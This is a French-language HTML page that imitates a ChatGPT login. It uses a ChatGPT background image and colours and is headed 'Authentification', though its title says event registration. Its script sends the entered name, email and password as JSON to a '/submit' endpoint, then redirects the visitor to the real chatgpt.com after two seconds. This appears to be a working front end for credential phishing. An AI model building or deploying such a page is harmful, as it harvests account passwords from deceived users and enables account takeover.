<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire d'Inscription - Événement</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background-image: url('/static/chatgpt-bg.png');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            background-repeat: no-repeat;
            background-color: #0d0d0d;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            background: #ffffff;
            padding: 50px;
            border-radius: 12px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3), 0 0 1px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 420px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            animation: slideUp 0.5s ease-out;
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        #formulaire {
            animation: fadeIn 0.6s ease-out;
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }
        
        h1 {
            text-align: center;
            color: #000000;
            margin-bottom: 10px;
            font-size: 28px;
            font-weight: 600;
        }
        
        p {
            text-align: center;
            color: #565869;
            margin-bottom: 30px;
            font-size: 14px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #0d0d0d;
            font-weight: 600;
            font-size: 14px;
            letter-spacing: 0.3px;
        }
        
        label .required {
            color: #ef4444;
            margin-left: 2px;
        }
        
        input {
            width: 100%;
            padding: 13px;
            border: 1px solid #d1d5db;
            border-radius: 8px;
            font-size: 14px;
            background: #f9fafb;
            color: #0d0d0d;
            transition: all 0.3s ease;
        }
        
        input::placeholder {
            color: #9ca3af;
        }
        
        input:hover {
            border-color: #e5e7eb;
            background: #ffffff;
        }
        
        input:focus {
            outline: none;
            border-color: #1a1b1b;
            background: #ffffff;
            box-shadow: 0 0 0 4px rgba(13, 15, 14, 0.1);
        }
        
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #252827 0%, #252827 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            letter-spacing: 0.5px;
            margin-top: 12px;
            box-shadow: 0 4px 15px rgba(37, 41, 40, 0.3);
        }
        
        button:hover:not(:disabled) {
            background: linear-gradient(135deg, #1b1f1e 0%, #1b1e1d 100%);
            box-shadow: 0 8px 20px rgba(52, 59, 57, 0.4);
            transform: translateY(-2px);
        }
        
        button:active:not(:disabled) {
            transform: translateY(0);
        }
        
        button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
        
        button.active {
            background: linear-gradient(135deg, #1c1f1e 0%, #171918 100%);
        }
        
        .message {
            margin-top: 20px;
            padding: 16px;
            border-radius: 8px;
            text-align: center;
            display: none;
            font-size: 14px;
            font-weight: 600;
            animation: slideIn 0.4s ease;
            border-left: 4px solid transparent;
        }
        
        .message.success {
            background: #f0fdf4;
            color: #15803d;
            display: block;
            border: 1px solid #bbf7d0;
            border-left-color: #10a37f;
        }
        
        .message.error {
            background: #fef2f2;
            color: #991b1b;
            display: block;
            border: 1px solid #fee2e2;
            border-left-color: #ef4444;
        }
        
        .loading {
            display: none;
            text-align: center;
            color: #10a37f;
            font-weight: 600;
            margin-top: 10px;
        }
        
        .spinner {
            border: 3px solid #e5e7eb;
            border-top: 3px solid #10a37f;
            border-radius: 50%;
            width: 18px;
            height: 18px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 10px;
            vertical-align: middle;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1> Authentification</h1>
        
        <form id="formulaire" onsubmit="envoyerFormulaire(event)">
            <div class="form-group">
                <label for="prenom">Prénom</label>
                <input type="text" id="prenom" name="prenom"  placeholder="Alaa">
            </div>
            
            <div class="form-group">
                <label for="nom">Nom</label>
                <input type="text" id="nom" name="nom"  placeholder="sekiou">
            </div>
            
            <div class="form-group">
                <label for="email">Email <span class="required">*</span></label>
                <input type="email" id="email" name="email" required placeholder="@gmail.com">
            </div>
            
            <div class="form-group">
                <label for="mdps">Mot de passe <span class="required">*</span></label>
                <input type="password" id="mdps" name="mdps" required placeholder="••••••••">
            </div>
            
            <div class="loading" id="loading">
                <span class="spinner"></span>
                <span>Inscription en cours...</span>
            </div>
            
            <button type="submit" id="submitBtn">Envoyez</button>
        </form>
        
        <div class="message" id="message"></div>
    </div>
    
    <script>
        async function envoyerFormulaire(event) {
            event.preventDefault();
            
            const prenom = document.getElementById('prenom').value;
            const nom = document.getElementById('nom').value;
            const email = document.getElementById('email').value;
            const mdps = document.getElementById('mdps').value;
            
            document.getElementById('loading').style.display = 'block';
            document.getElementById('submitBtn').disabled = true;
            
            try {
                const response = await fetch('/submit', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        prenom: prenom,
                        nom: nom,
                        email: email,
                        mdps: mdps
                    })
                });
                
                const data = await response.json();
                const messageDiv = document.getElementById('message');
                
                if (data.success) {
                    messageDiv.className = 'message success';
                    messageDiv.textContent = '✓ ' + data.message;
                    document.getElementById('formulaire').reset();
                    
                    // Redirection vers ChatGPT après 2 secondes
                    setTimeout(() => {
                        window.location.href = 'https://chatgpt.com';
                    }, 2000);
                } else {
                    messageDiv.className = 'message error';
                    messageDiv.textContent = '✗ ' + data.message;
                }
            } catch (error) {
                document.getElementById('message').className = 'message error';
                document.getElementById('message').textContent = '✗ Erreur : ' + error.message;
            } finally {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('submitBtn').disabled = false;
            }
        }
    </script>
</body>
</html>
